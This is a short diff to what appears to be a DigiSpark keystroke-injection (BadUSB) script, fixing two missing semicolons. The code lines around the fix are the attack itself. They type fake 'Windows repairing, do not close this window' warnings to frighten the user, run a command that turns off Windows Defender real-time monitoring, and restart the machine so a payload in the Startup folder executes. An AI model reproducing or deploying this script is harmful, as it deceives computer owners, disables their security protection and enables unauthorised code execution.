@@ -51,7 +51,7 @@ Please see "clippy.txt" for list of phrases.
       DigiKeyboard.print("DO NOT CLOSE THIS WINDOW!! WINDOWS REPAIRING "cxdrv(1).dll" REPAIRING MISSING FILE STRUCTURE");
       DigiKeyboard.print("DO NOT CLOSE THIS WINDOW OR POSSIBLE CURRUPTION OF C: DRIVE");
       DigiKeyboard.delay(2000);
-      DigiKeyboard.print("cls")
+      DigiKeyboard.print("cls");
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       // Disable Windows Defender
       DigiKeyboard.print("STRING Set-MpPreference -DisableRealtimeMonitoring $true");
@@ -75,7 +75,7 @@ Please see "clippy.txt" for list of phrases.
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       DigiKeyboard.delay(1000);
       // Restart computer payload will execute on startup ($StartupDir = [environment]::getfolderpath('Startup'))
-      DigiKeyboard.print("Restart-Computer")
+      DigiKeyboard.print("Restart-Computer");
       while(true){
         //do nothing
       }
